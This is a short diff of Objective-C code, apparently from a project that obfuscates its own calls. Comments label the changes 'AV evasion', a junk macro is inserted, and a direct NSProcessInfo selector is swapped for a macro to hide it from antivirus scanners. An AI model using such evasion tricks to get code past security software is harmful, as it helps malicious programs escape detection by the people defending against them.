@@ -63,7 +63,7 @@
       // AV evasion: only on release build
       AV_GARBAGE_001
       
-      NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+      NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
       NSString *_processName      = [[processInfo processName] copy];
       
       // AV evasion: only on release build
